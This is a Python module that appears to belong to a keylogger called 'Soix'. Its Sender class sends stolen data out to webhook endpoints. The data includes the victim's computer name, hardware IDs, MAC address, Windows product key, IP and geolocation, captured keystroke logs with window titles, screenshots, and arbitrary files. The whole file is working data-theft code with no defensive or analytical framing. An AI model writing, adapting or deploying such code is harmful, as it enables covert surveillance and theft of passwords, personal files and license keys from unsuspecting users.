import requests, json
from . import info

pc = info.Info()

class Sender:
	def __init__(self,):
		self.webhook_log_url = ''
		self.webhook_info_url = ''

	def send_info(self):
		payload = {"username":"Soix",
					"avatar_url":"https://i.ibb.co/1GLSqbb/logo.png",
					"tts":False,
					"content":"@everyone",
					"embeds":[{
						"id":747655115,
						"type": "rich",
						"title": "",
						"description" : f"**__System Info__**\n```autohotkey\nComputer Name: {pc.HostName()}\nComputer OS: {pc.OSPlatform()} {pc.OSVersion()}\nCPU: {pc.Processor()}\nMac Address: {pc.MacAddress()}\nHWID: {pc.HWID()}\nTotal Cores: {pc.TotalCores()}\nTotal RAM: {pc.TotalRAM()}\nProduct Key: {pc.WindowProductKey()}\n```\n**__IP Info__**```prolog\nIP: {pc.IP()}\nRegion: {pc.IPData()['region']}\nCountry: {pc.IPData()['country']}\nCity: {pc.IPData()['city']}\nOrg: {pc.IPData()['org']}\n```",
						"author":{
							"name":"Soix",
							"url":"https://kocoweb.com"
							},
						"color":34303,
						"footer":{
							"text":"Soix Info"
								}
							}],
					}
		requests.post(self.webhook_info_url, json = payload)

	def send(self, log = '', window = None, image_path = None):
		log = f'```\n{log}\n```' if log != '' else '```None```'
		window = 'Keylogger' if window == None else window
		payload = {"username":"Soix",
					"avatar_url":"https://i.ibb.co/1GLSqbb/logo.png",
					"content":f"**New Log From {pc.HostName()}**",
					"tts":False,
					"embeds":[{
						"id":747655115,
						"description":log,
						"author":{
							"name":"Soix",
							"url":"https://kocoweb.com"
							},
						"title":f"**{window}**",
						"color":34303,
						"footer":{
							"text":"Soix Logger"
								}
							}]
					}
		files = {'payload_json': (None, '{"username":"Soix", "content": "", "avatar_url":"https://i.ibb.co/1GLSqbb/logo.png"}'),
				'media': open(image_path, 'rb')} if image_path != None else None
		requests.post(self.webhook_log_url, json = payload)
		requests.post(self.webhook_log_url, files=files) if files != None else None

	def send_file(self, file_path, msg = None):
		msg = "**File Sender**" if msg == None else msg
		files = {'payload_json': (None, '{"username":"Soix", "content": "'+ msg +'", "avatar_url":"https://i.ibb.co/1GLSqbb/logo.png"}'),
				"media": open(file_path, 'rb')}
		requests.post(self.webhook_info_url, files=files)